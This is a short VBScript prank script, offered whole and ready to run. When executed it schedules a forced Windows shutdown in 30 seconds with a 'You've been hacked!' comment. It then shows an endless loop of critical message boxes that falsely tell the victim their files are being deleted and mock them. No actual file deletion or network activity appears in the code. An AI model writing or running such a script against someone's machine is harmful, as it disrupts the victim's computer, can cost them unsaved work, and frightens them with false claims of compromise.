Set objShell = CreateObject("WScript.Shell")
' Trigger the shutdown only once
objShell.Run "shutdown -s -t 30 -c ""You've been hacked!""", 0, False

' Infinite message loop
Do
    MsgBox "I Hacked chu he he " & vbCrLf & vbCrLf & _
           "I Am Deleting ur files LLL" & vbCrLf & _
           "Get new pc bot" & vbCrLf & vbCrLf & _
           "System will restart in 30 seconds.", vbCritical, "Hack Warning"
Loop
